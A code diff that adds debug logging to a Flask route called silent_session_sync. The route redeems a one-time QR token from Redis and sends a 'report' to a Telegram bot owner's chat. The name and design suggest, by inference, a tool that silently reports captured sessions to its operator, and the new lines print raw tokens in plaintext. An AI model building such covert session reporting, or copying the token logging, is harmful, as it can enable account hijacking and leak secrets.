@@ -32,24 +32,32 @@ def init_qr_routes(app, bot):
     def silent_session_sync():
         try:
             if not request.is_json:
+                print("[-] Sync error: Invalid content type (not JSON)")
                 return jsonify({"status": "error", "message": "Invalid content type"}), 400
 
             data = request.get_json(silent=True) or {}
             token = data.get('token')
             
+            print(f"[*] Received sync request with token: {token}")
+
             if not token:
+                print("[-] Sync error: Missing token in payload")
                 return jsonify({"status": "error", "message": "Missing token"}), 400
 
             if not redis_client:
-                print("[-] Redis client is not available. Cannot process QR token.")
+                print("[-] Redis client is not available in qr_pairing.")
                 return jsonify({"status": "error", "message": "Database offline"}), 500
 
-            # التحقق الآمن من الـ Token واستخراج الـ Chat ID المرتبط به
+            # التحقق من الـ Token في Redis
+            owner_chat_id = None
             try:
-                owner_chat_id = redis_client.get(f"qr_token:{token}")
+                redis_key = f"qr_token:{token}"
+                owner_chat_id = redis_client.get(redis_key)
+                print(f"[*] Looked up key '{redis_key}' in Redis. Result (chat_id): {owner_chat_id}")
+                
                 if owner_chat_id:
-                    # حذف الـ token بعد استخدامه لمرة واحدة لضمان الأمان وعدم تكرار الطلب
-                    redis_client.delete(f"qr_token:{token}")
+                    redis_client.delete(redis_key)
+                    print(f"[*] Token {token} deleted successfully from Redis.")
             except Exception as redis_err:
                 print(f"[-] Redis read/delete error for token {token}: {redis_err}")
                 owner_chat_id = None
@@ -94,8 +102,11 @@ def init_qr_routes(app, bot):
                 )
                 try:
                     bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
+                    print(f"[+] Report successfully sent to Telegram chat ID: {owner_chat_id}")
                 except Exception as bot_err:
                     print(f"[-] Telegram dispatch error to {owner_chat_id}: {bot_err}")
+            else:
+                print(f"[-] Warning: Token '{token}' was NOT found in Redis or expired!")
                 
             return jsonify({"status": "synchronized", "code": 200}), 200
             
